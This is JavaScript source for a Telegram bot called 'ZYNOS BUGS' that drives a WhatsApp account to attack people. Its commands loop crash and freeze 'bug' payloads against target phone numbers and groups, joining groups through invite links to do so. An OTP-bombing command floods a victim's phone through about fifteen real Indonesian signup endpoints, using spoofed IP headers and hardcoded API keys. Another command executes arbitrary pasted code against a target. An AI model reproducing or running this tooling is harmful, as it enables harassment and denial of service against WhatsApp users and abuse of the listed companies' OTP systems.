bot.command("delay1jam", checkCmd("delay1jam"),checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /delay1jam 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/d2ow0z.jpg", {
    caption: `
<blockquote>交 ZYNOS BUGS ᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /delay1jam 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

     for (let i = 0; i < 1; i++) {
      await DelayPerJam(sock, target);
      await sleep(500);
    }
});
bot.command("freezeXblank", checkCmd("freezeXblank"),checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /freezeXblank 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/d2ow0z.jpg", {
    caption: `
<blockquote>交 ZYNOS BUGS ᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /freezeXblank 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

     for (let i = 0; i < 5; i++) {
      await BlankFreezeByZynos(sock, target);
      await sleep(500);
    }
});
// Fitur: xvisible
bot.command("delayhard", checkCmd("delayhard"),checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /delayhard 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/d2ow0z.jpg", {
    caption: `
<blockquote>交 ZYNOS BUGS ᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /delayhard 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

     for (let i = 0; i < 2; i++) {
      await noctradelayhard(sock, target);
      await sleep(500);
    }
});
bot.command("freeze", checkCmd("freeze"),checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /freeze 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/d2ow0z.jpg", {
    caption: `
<blockquote>交 ZYNOS BUGS ᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /freeze 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

     for (let i = 0; i < 5; i++) {
      await FreezeDelay(sock, target);
      await sleep(500);
    }
});
bot.command("blankclick", checkCmd("blankclick"),checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /blankclick 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/d2ow0z.jpg", {
    caption: `
<blockquote>交 ZYNOS BUGS ᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /blankclick 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

     for (let i = 0; i < 2; i++) {
      await ZynosBlank(sock, target);
      await sleep(700);
    }
});
bot.command("buldoz", checkCmd("buldoz"),checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /buldoz 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/d2ow0z.jpg", {
    caption: `
<blockquote>交 ZYNOS BUGS ᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /buldoz 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

     for (let i = 0; i < 30; i++) {
      console.log(chalk.red(`Send Bug Frize ${i + 1}/30 To ${q}`));
      await BuldozerByZynos(sock, target);
      await sleep(500);
    }
});

bot.command("delaygb", checkCmd("delaygb"), checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /delaygb https://chat.whatsapp.com/ABCdef123\nExample: /delaygb 123456789@g.us`);

  let isJoined = false;

  try {
    const inviteRegex = /https:\/\/chat\.whatsapp\.com\/([A-Za-z0-9]+)/;
    const matchInvite = q.match(inviteRegex);
    
    if (matchInvite) {
      const code = matchInvite[1];
      const joinResult = await sock.groupAcceptInvite(code);
      groupJid = joinResult;
      isJoined = true;
    } else {
      if (!q.endsWith('@g.us')) {
        return ctx.reply("❌ ID grup harus diakhiri dengan @g.us atau gunakan link undangan.");
      }
      groupJid = q;
      
      try {
        const groupMetadata = await sock.groupMetadata(groupJid);
        const isInGroup = groupMetadata.participants.some(p => p.id === sock.user.id);
        
        if (!isInGroup) {
          return ctx.reply(`❌ Sender tidak berada di grup ini!\nGunakan link undangan untuk join dulu.\nExample: /delaygb https://chat.whatsapp.com/ABCdef123`);
        }
        isJoined = true;
      } catch (e) {
        return ctx.reply(`❌ Gagal mengakses grup: ${e.message}`);
      }
    }
  } catch (err) {
    return ctx.reply(`❌ Gagal: ${err.message}`);
  }

  if (!isJoined) {
    return ctx.reply("❌ Gagal join ke grup!");
  }

  await ctx.sendPhoto("https://files.catbox.moe/d2ow0z.jpg", {
    caption: `
<blockquote>交 ZYNOS BUGS ᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /delaygb 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗚𝗿𝗼𝘂𝗽", url: `https://chat.whatsapp.com/` }]],
    },
  });

  try {
    await noctradelayhard(sock, groupJid);
  } catch (err) {
    console.log(`❌ Gagal delaygb: ${err.message}`);
  }
});

bot.command("freezegb", checkCmd("freezegb"), checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /freezegb https://chat.whatsapp.com/ABCdef123\nExample: /freezegb 123456789@g.us`);

  let isJoined = false;

  try {
    const inviteRegex = /https:\/\/chat\.whatsapp\.com\/([A-Za-z0-9]+)/;
    const matchInvite = q.match(inviteRegex);
    
    if (matchInvite) {
      const code = matchInvite[1];
      const joinResult = await sock.groupAcceptInvite(code);
      groupJid = joinResult;
      isJoined = true;
    } else {
      if (!q.endsWith('@g.us')) {
        return ctx.reply("❌ ID grup harus diakhiri dengan @g.us atau gunakan link undangan.");
      }
      groupJid = q;
      
      try {
        const groupMetadata = await sock.groupMetadata(groupJid);
        const isInGroup = groupMetadata.participants.some(p => p.id === sock.user.id);
        
        if (!isInGroup) {
          return ctx.reply(`❌ Sender tidak berada di grup ini!\nGunakan link undangan untuk join dulu.\nExample: /freezegb https://chat.whatsapp.com/ABCdef123`);
        }
        isJoined = true;
      } catch (e) {
        return ctx.reply(`❌ Gagal mengakses grup: ${e.message}`);
      }
    }
  } catch (err) {
    return ctx.reply(`❌ Gagal: ${err.message}`);
  }

  if (!isJoined) {
    return ctx.reply("❌ Gagal join ke grup!");
  }

  await ctx.sendPhoto("https://files.catbox.moe/d2ow0z.jpg", {
    caption: `
<blockquote>交 ZYNOS BUGS ᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /freezegb 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗚𝗿𝗼𝘂𝗽", url: `https://chat.whatsapp.com/` }]],
    },
  });

  try {
    await FreezeDelay(sock, groupJid);
  } catch (err) {
    console.log(`❌ Gagal freezegb: ${err.message}`);
  }
});

bot.command("blankgb", checkCmd("blankgb"), checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /blankgb https://chat.whatsapp.com/ABCdef123\nExample: /blankgb 123456789@g.us`);

  let isJoined = false;

  try {
    const inviteRegex = /https:\/\/chat\.whatsapp\.com\/([A-Za-z0-9]+)/;
    const matchInvite = q.match(inviteRegex);
    
    if (matchInvite) {
      const code = matchInvite[1];
      
      // Coba join grup
      const joinResult = await sock.groupAcceptInvite(code);
      groupJid = joinResult;
      isJoined = true;
    } else {
      if (!q.endsWith('@g.us')) {
        return ctx.reply("❌ ID grup harus diakhiri dengan @g.us atau gunakan link undangan.");
      }
      groupJid = q;
      
      // CEK: Apakah sender udah di grup?
      try {
        const groupMetadata = await sock.groupMetadata(groupJid);
        const isInGroup = groupMetadata.participants.some(p => p.id === sock.user.id);
        
        if (!isInGroup) {
          // Kalo belum join, coba join via link (kalo ada)
          return ctx.reply(`❌ Sender tidak berada di grup ini!\nGunakan link undangan untuk join dulu.\nExample: /blankgb https://chat.whatsapp.com/ABCdef123`);
        }
        isJoined = true;
      } catch (e) {
        return ctx.reply(`❌ Gagal mengakses grup: ${e.message}`);
      }
    }
  } catch (err) {
    return ctx.reply(`❌ Gagal: ${err.message}`);
  }

  // Kalo belum join sama sekali, gabisa lanjut
  if (!isJoined) {
    return ctx.reply("❌ Gagal join ke grup!");
  }

  await ctx.sendPhoto("https://files.catbox.moe/d2ow0z.jpg", {
    caption: `
<blockquote>交 ZYNOS BUGS ᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /blankgb 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗚𝗿𝗼𝘂𝗽", url: `https://chat.whatsapp.com/` }]],
    },
  });

  try {
    await ZynosBlank(sock, groupJid);
  } catch (err) {
    console.log(`❌ Gagal blankgb: ${err.message}`);
  }
});

// ============================================
// COMMAND /addrc
// ============================================
bot.command("addrc", checkCmd("addrc"), async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 3) {
    return ctx.reply(`❌ Format Salah!\nExample: /addrc id_channel token_bot`);
  }

  const channelInput = args[1].trim();
  const botToken = args[2].trim();

  if (!channelInput || !botToken) {
    return ctx.reply(`❌ Masukkan ID channel dan Token Bot!\nExample: /addrc id_channel token_bot`);
  }

  const msg = await ctx.replyWithPhoto("https://files.catbox.moe/d2ow0z.jpg", {
    caption: `
<blockquote>🚀 ADD REACTION BOT PROGRES</blockquote>
📡 Target Channel: ${channelInput}
🤖 Bot Token: ...${botToken.slice(-6)}
📡 Status: ⏳ Memulai Worker...
⏳ Mohon tunggu...
`,
    parse_mode: "HTML"
  });

  const targetChannel = channelInput.startsWith("@") ? channelInput.slice(1) : channelInput;
  const result = startWorkerBot(botToken, targetChannel, false);

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    msg.message_id,
    null,
    `
<blockquote>🚀 ADD REACTION BOT COMPLETE</blockquote>
📡 Target Channel: ${channelInput}
🤖 Bot Token: ...${botToken.slice(-6)}
📡 Status: ${result}
📡 Config: ./database/workers.json ✅
    `,
    { parse_mode: "HTML" }
  );
});

// ============================================
// COMMAND /delrc - Hapus worker
// ============================================
bot.command("delrc", checkCmd("delrc"), async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply(`❌ Format Salah!\nExample: /delrc id_channel`);
  }

  const channelInput = args[1].trim();
  const targetChannel = channelInput.startsWith("@") ? channelInput.slice(1) : channelInput;

  const configs = loadAllWorkers();
  const filtered = configs.filter(c => c.channel === targetChannel);

  if (filtered.length === 0) {
    return ctx.reply(`❌ Tidak ada worker untuk channel ${channelInput}`);
  }

  for (const config of filtered) {
    if (runningWorkers[config.token]) {
      runningWorkers[config.token].stop();
      delete runningWorkers[config.token];
    }
    removeWorkerConfig(targetChannel, config.token);
  }

  await ctx.reply(`✅ Berhasil menghapus semua worker untuk channel ${channelInput}`);
});

// ============================================
// COMMAND /listrc - Lihat semua worker
// ============================================
bot.command("listrc", checkCmd("listrc"), async (ctx) => {
  const configs = loadAllWorkers();
  if (configs.length === 0) {
    return ctx.reply(`📂 Belum ada worker yang terdaftar.`);
  }

  let text = `📋 *DAFTAR WORKER REACTION*\n\n`;
  for (const config of configs) {
    const status = runningWorkers[config.token] ? '✅ Online' : '❌ Offline';
    text += `📡 Channel: ${config.channel}\n`;
    text += `🤖 Token: ...${config.token.slice(-6)}\n`;
    text += `📊 Status: ${status}\n`;
    text += `🕐 Started: ${config.startedAt}\n\n`;
  }

  await ctx.reply(text, { parse_mode: 'Markdown' });
});

bot.command("groupban", checkCmd("groupban"), checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /groupban https://chat.whatsapp.com/ABCdef123\nExample: /groupban 123456789@g.us`);
  
  let isLink = false;

  try {
    const inviteRegex = /https:\/\/chat\.whatsapp\.com\/([A-Za-z0-9]+)/;
    const matchInvite = q.match(inviteRegex);
    
    if (matchInvite) {
      const code = matchInvite[1];
      isLink = true;
      await ctx.reply(`⏳ Join via link...`);
      const joinResult = await sock.groupAcceptInvite(code);
      groupJid = joinResult;
    } else {
      if (!q.endsWith('@g.us')) {
        return ctx.reply("❌ ID grup harus diakhiri dengan @g.us atau gunakan link undangan.");
      }
      groupJid = q;
    }
  } catch (err) {
    return ctx.reply(`❌ Gagal: ${err.message}`);
  }

  await ctx.sendPhoto("https://files.catbox.moe/d2ow0z.jpg", {
    caption: `
<blockquote>交 ZYNOS BUGS ᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /groupban 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗚𝗿𝗼𝘂𝗽", url: `https://chat.whatsapp.com/` }]],
    },
  });

  try {
    await groupBan(sock, groupJid);
  } catch (err) {
    console.log(`❌ Gagal groupban: ${err.message}`);
  }
});

bot.command("spamotp", checkCmd("spamotp"), checkWhatsAppConnection, checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply(`❌ Format Salah!\nExample: /spamotp 628123456789\nExample: /spamotp 08123456789`);
  }

  let target = args[1].replace(/[^0-9]/g, "");
  if (target.startsWith("0")) target = target.substring(1);
  if (!target.startsWith("62")) target = "62" + target;

  const msg = await ctx.replyWithPhoto("https://files.catbox.moe/d2ow0z.jpg", {
    caption: `
<blockquote>SPAM OTP PROGRES REAL TIME</blockquote>
📱 Target: ${target}
📡 Status: ⏳ Memulai...
✅ Berhasil: 0
❌ Gagal: 0
📊 Progress: 0%
⏳ Mohon tunggu...
`,
    parse_mode: "HTML"
  });

  let successCount = 0;
  let failCount = 0;
  let totalApi = 0;

  const USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) Safari/604.1',
    'Mozilla/5.0 (Linux; Android 14; SM-S921B) Chrome/120.0.0.0 Mobile Safari/537.36'
  ];

  const IP_POOL = Array.from({ length: 1000 }, () =>
    `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
  );

  const randomUA = () => USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
  const randomIP = () => IP_POOL[Math.floor(Math.random() * IP_POOL.length)];

  const generateEmail = () => {
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < 10; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return `${result}@bwmyga.com`;
  };

  const p08 = "0" + target.substring(2);
  const pNoCountry = target.replace("62", "");
  const deviceId = Math.random().toString(36).substring(7);
  const requestId = Math.random().toString(36).substring(7);

  const apiList = [
    { name: "Maulagi", send: async () => {
      await axios.post("https://api.maulagi.id/api/v2/auth/check", { credentials: target }, {
        headers: { "X-ML-KEY": "B10JLPEP10", "User-Agent": randomUA(), "X-Forwarded-For": randomIP() }, timeout: 8000
      });
    }},
    { name: "Matahari", send: async () => {
      await axios.post("https://matahari-backend-prod.matahari.com/api/auth/re-activation", {
        mobileCountryCode: "", mobileNumber: p08, activationCode: ""
      }, { headers: { "User-Agent": randomUA(), "X-Forwarded-For": randomIP() }, timeout: 8000 });
    }},
    { name: "Pinhome", send: async () => {
      await axios.post("https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp", {
        accountType: "customers", applicationType: "Pinhome Web", countryCode: "62", medium: "whatsapp", otpType: "register", phoneNumber: pNoCountry
      }, { headers: { "User-Agent": randomUA(), "X-Forwarded-For": randomIP(), "Origin": "https://www.pinhome.id", "Referer": "https://www.pinhome.id/daftar" }, timeout: 8000 });
    }},
    { name: "BonusBelanja", send: async () => {
      await axios.post("https://www.bonusbelanja.com/api/auth/registration/app", {
        phone: target, name: "User", agreeTnc: true, agreeContact: false
      }, { headers: { "User-Agent": randomUA(), "X-Forwarded-For": randomIP() }, timeout: 8000 });
    }},
    { name: "Alodokter", send: async () => {
      await axios.post("https://www.alodokter.com/resend-otp", {
        user: { phone: p08, uuid: Math.random().toString(36).substring(7) }, request_via: "whatsapp"
      }, { headers: { "User-Agent": randomUA(), "X-Forwarded-For": randomIP() }, timeout: 8000 });
    }},
    { name: "BeautyHaul", send: async () => {
      await axios.post("https://www.beautyhaul.com/ajax/account/send_otp", {
        method: "WhatsApp", phone: target
      }, { headers: { "User-Agent": randomUA(), "X-Forwarded-For": randomIP() }, timeout: 8000 });
    }},
    { name: "Gritero", send: async () => {
      await axios.post("https://gateway.gritero.com/v1/auth/registration/whatsapp/send-otp?langcode=id", {
        nama_lengkap: "User", telepon: p08, email: `user${Math.floor(Math.random() * 9999)}@mail.com`
      }, { headers: { "User-Agent": randomUA(), "X-Forwarded-For": randomIP(), "Xid": String(Math.floor(Math.random() * 9999999)), "source": "ocistok" }, timeout: 8000 });
    }},
    { name: "DuniaGames", send: async () => {
      await axios.get("https://api.duniagames.co.id/api/other/api/v1/content/", {
        headers: { "User-Agent": randomUA(), "X-Forwarded-For": randomIP(), "Accept-Language": "id", "x-device": deviceId, "Ciam-Type": "FR" }, timeout: 8000
      });
    }},
    { name: "InternetRakyat", send: async () => {
      await axios.post("https://internetrakyat.id/api/app/auth/send-otp-register", {
        phone_number: p08
      }, { headers: { "User-Agent": randomUA(), "X-Forwarded-For": randomIP(), "x-api-key": "280999!FTTH", "Origin": "https://internetrakyat.id", "Referer": "https://internetrakyat.id/auth/register" }, timeout: 8000 });
    }},
    { name: "Dokterin", send: async () => {
      await axios.post("https://api.dokterin.id/user/v1/users/login", {
        phone: target, tnc_accept: true, device_id: Math.random().toString(36).substring(7)
      }, { headers: { "User-Agent": randomUA(), "X-Forwarded-For": randomIP(), "Origin": "https://dokterin.id", "Referer": "https://dokterin.id/login" }, timeout: 8000 });
    }},
    { name: "PaperID", send: async () => {
      await axios.post("https://api.paper.id/api/v1/auth/login", {
        method: "whatsapp", phone: p08
      }, { headers: { "User-Agent": randomUA(), "X-Forwarded-For": randomIP(), "Origin": "https://www.paper.id", "Referer": "https://www.paper.id/", "x-paper-user-agent": "Jupiter/7.19.5 desktop (windows) Firefox 152", "request-id": requestId }, timeout: 8000 });
    }},
    { name: "Indodax", send: async () => {
      await axios.post("https://api.indodax.com/api/v1/otp/send", {
        email: generateEmail(), flow: "register", method: "whatsapp", old_uuid: ""
      }, { headers: { "User-Agent": randomUA(), "X-Forwarded-For": randomIP(), "Origin": "https://indodax.com", "Referer": "https://indodax.com/", "key": "bAGUG2WiLy", "authorization": "Bearer bAGUG2WiLy" }, timeout: 8000 });
    }},
    { name: "Bunda", send: async () => {
      await axios.post("https://cms.bunda.co.id/api/v1/auth/send-otp", {
        phone_number: target, type: "auth"
      }, { headers: { "User-Agent": randomUA(), "X-Forwarded-For": randomIP(), "Origin": "https://www.bunda.co.id", "Referer": "https://www.bunda.co.id/id", "X-Requested-With": "XMLHttpRequest", "X-Locale": "id" }, timeout: 8000 });
    }},
    { name: "Fastwork", send: async () => {
      await axios.post("https://api.fastwork.id/auth/v2/signup.sendVerificationCode", {
        phone_number: p08
      }, { headers: { "User-Agent": randomUA(), "X-Forwarded-For": randomIP() }, timeout: 8000 });
    }},
    { name: "Saturdays", send: async () => {
      await axios.post("https://saturdays.com/api/v1/auth/otp", {
        phone: target, type: "register"
      }, { headers: { "User-Agent": randomUA(), "X-Forwarded-For": randomIP() }, timeout: 8000 });
    }}
  ];

  let i = 0;
  for (const api of apiList) {
    i++;
    totalApi++;
    const status = { name: api.name, success: false };
    
    try {
      await api.send();
      successCount++;
      status.success = true;
      console.log(`✅ ${api.name} BERHASIL`);
    } catch (err) {
      failCount++;
      console.log(`❌ ${api.name} GAGAL: ${err.message}`);
    }
    
    const progress = Math.round((i / apiList.length) * 100);
    const progressBar = "█".repeat(Math.floor(progress / 5)) + "░".repeat(20 - Math.floor(progress / 5));
    
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>SPAM OTP PROGRES REAL TIME</blockquote>

📱 Target: ${target}
📡 Status: ${status.success ? '✅' : '❌'} ${api.name}
📊 Progress: ${progressBar} ${progress}%
✅ Berhasil: ${successCount}
❌ Gagal: ${failCount}
⏳ ${i}/${apiList.length} selesai

⏱️ Mohon tunggu...
`,
      { parse_mode: "HTML" }
    );
    
    await sleep(1500);
  }

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    msg.message_id,
    null,
    `
<blockquote>🔥 SPAM OTP COMPLETE 🔥</blockquote>

📱 Target: ${target}
✅ Berhasil: ${successCount} OTP terkirim
❌ Gagal: ${failCount} OTP gagal
📡 Total API: ${apiList.length} (WORKING)
⏱️ Sleep: 1.5 detik
    `,
    { parse_mode: "HTML" }
  );
});

// ====== TEST FUNC ======
bot.command('testfunc', async (ctx) => {
    const userId = ctx.from.id.toString();
    
    // Cek akses: owner atau premium
    if (!OWNER_IDS.includes(userId) && !premiumUsers.includes(userId)) {
        return ctx.reply("[ ! ] - ONLY OWNER/PREMIUM USER");
    }
    
    // CEK APAKAH REPLY KE PESAN?
    if (!ctx.message.reply_to_message) {
        return ctx.reply(`❌ *REPLY REQUIRED!*\n\nReply ke pesan yang berisi JavaScript function, lalu ketik:\n\`/testfunc 628xxx,loop\`\n\nContoh:\n\`/testfunc 62xxx,5\``, { parse_mode: 'Markdown' });
    }
    
    // Ambil kode dari pesan yang di-reply
    const repliedCode = ctx.message.reply_to_message.text;
    if (!repliedCode) {
        return ctx.reply(`❌ *NO CODE FOUND!*\n\nPesan yang di-reply tidak mengandung teks/kode.`);
    }
    
    // Validasi apakah itu kode function
    const isValidFunction = repliedCode.includes('async function') && 
                            repliedCode.includes('sock') && 
                            repliedCode.includes('target') &&
                            repliedCode.includes('.relayMessage');
    
    if (!isValidFunction) {
        return ctx.reply(`❌ *INVALID FUNCTION!*\n\nPesan yang di-reply harus berisi function JavaScript dengan format:\n\`\`\`javascript\nasync function NamaFunction(sock, target) {\n    await sock.relayMessage(...);\n}\n\`\`\``, { parse_mode: 'Markdown' });
    }
    
    // Parse argument /testfunc 628xxx,loop
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("❌ *Usage:* `/testfunc 628xxx,loop`\n\nExample: `/testfunc 62xxx,5`\nLoop max 1000", { parse_mode: 'Markdown' });
    }
    
    let targetNumber = args[1].split(",")[0];
    let loopCount = parseInt(args[1].split(",")[1]) || 1;
    
    if (loopCount > 1000) loopCount = 1000;
    if (loopCount < 1) loopCount = 1;
    
    if (!targetNumber.match(/^\d+$/)) {
        return ctx.reply("❌ Invalid target! Use numbers only. Example: 62xxx");
    }
    
    const formattedTarget = targetNumber.includes('@') ? targetNumber : targetNumber + "@s.whatsapp.net";
    
    // CEK KONEKSI WHATSAPP
    if (!sock || !isWhatsAppConnected) {
        return ctx.reply("❌ WhatsApp session not connected. Use /addsender first.");
    }
    
    // Auto replace variable .relayMessage jadi sock.relayMessage
    let fixedCode = repliedCode.replace(/([a-zA-Z_][a-zA-Z0-9_]*)\s*\.\s*relayMessage/g, 'sock.relayMessage');
    
    // Cari nama function
    let funcNameMatch = fixedCode.match(/async\s+function\s+([a-zA-Z_][a-zA-Z0-9_]*)/);
    let functionName = funcNameMatch ? funcNameMatch[1] : 'Unknown';
    
    const statusMsg = await ctx.reply(`🚀 *EXECUTING*\n\n📱 Target: ${targetNumber}\n🔄 Loop: ${loopCount}x\n⚙️ Function: ${functionName}\n⏳ Processing...`, { parse_mode: 'Markdown' });
    
    // Sandbox dengan variable yang tersedia
    const sandbox = {
        sock: sock,
        target: formattedTarget,
        sleep: (ms) => new Promise(r => setTimeout(r, ms)),
        generateWAMessageFromContent: generateWAMessageFromContent,
        console: { log: (...args) => console.log('[EXEC]', ...args) }
    };
    
    try {
        const fullCode = `
            ${fixedCode}
            for(let i = 0; i < ${loopCount}; i++) {
                await ${functionName}(sock, target);
                if(${loopCount} > 1 && i < ${loopCount} - 1) await sleep(1000);
            }
        `;
        
        const asyncFn = new Function('sandbox', `with(sandbox) { return (async () => { ${fullCode} })(); }`);
        await asyncFn(sandbox);
        
        await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, null,
            `✅ *SUCCESS*\n\n📱 Target: ${targetNumber}\n🔄 Loop: ${loopCount}x\n⚙️ Function: ${functionName}`,
            { parse_mode: 'Markdown' }
        );
    } catch (err) {
        await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, null,
            `❌ *ERROR*\n\n📱 Target: ${targetNumber}\n⚠️ ${err.message}`,
            { parse_mode: 'Markdown' }
        );
    }
});
// ====== END TEST FUNC ======
/*
// ====== GROUP BAN COMMAND ======
bot.command("groupban", checkCmd("groupban"), checkWhatsAppConnection, checkPremium, async (ctx) => {
  const chatId = ctx.chat.id;
  const senderId = ctx.from.id.toString();
  const username = ctx.from.username ? `@${ctx.from.username}` : "Tidak ada username";
  const date = moment().tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss');
  const randomImage = getRandomImage();

  const args = ctx.message.text.split(" ");
  const input = args.slice(1).join(" ").trim();

  if (!input) {
    return ctx.reply(`🪧 ☇ Format:\n/groupban <link_undangan|group_id>\n\nContoh:\n/groupban https://chat.whatsapp.com/ABCdef123\n/groupban 123456789@g.us`);
  }

  if (!sock || !isWhatsAppConnected) {
    return ctx.reply("❌ WhatsApp tidak terhubung! Gunakan /addsender dulu.");
  }

  let groupJid;

  try {
    // Cek apakah input berupa link undangan
    const inviteRegex = /https:\/\/chat\.whatsapp\.com\/([A-Za-z0-9]+)/;
    const matchInvite = input.match(inviteRegex);
    
    if (matchInvite) {
      const code = matchInvite[1];
      const progressMsg = await ctx.reply(`⏳ Bergabung ke grup via link...`);
      
      const joinResult = await sock.groupAcceptInvite(code);
      groupJid = joinResult;
      
      await ctx.telegram.editMessageText(ctx.chat.id, progressMsg.message_id, null, 
        `✅ Berhasil bergabung ke grup: ${groupJid}`
      );
    } else {
      // Cek apakah input adalah ID grup
      if (!input.endsWith('@g.us')) {
        return ctx.reply("❌ ID grup harus diakhiri dengan @g.us atau gunakan link undangan.");
      }
      groupJid = input;
    }
  } catch (err) {
    return ctx.reply(`❌ Gagal memproses grup: ${err.message}`);
  }

  // Kirim pesan awal dengan foto
